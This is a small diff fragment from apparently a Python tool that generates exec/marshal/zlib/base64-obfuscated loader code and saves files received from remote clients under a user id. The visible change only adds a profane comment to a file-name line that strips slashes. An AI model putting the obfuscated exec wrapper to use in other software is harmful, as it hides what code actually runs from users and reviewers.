@@ -331,7 +331,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             os.makedirs("files_saved")
 
         date_format = "%Y-%m-%d-%H-%M-%S"
-        file_name = data['file_name'].split("/")[-1]
+        file_name = data['file_name'].split("/")[-1] #FUCK U THIS IS LINUX IF U HAVE A / IN YOU FILE NAME, CRY ABOUT IT
         with open(
             f"files_saved/{data['uid']}_{datetime.datetime.now().strftime(date_format)}_{file_name}",
             "wb",
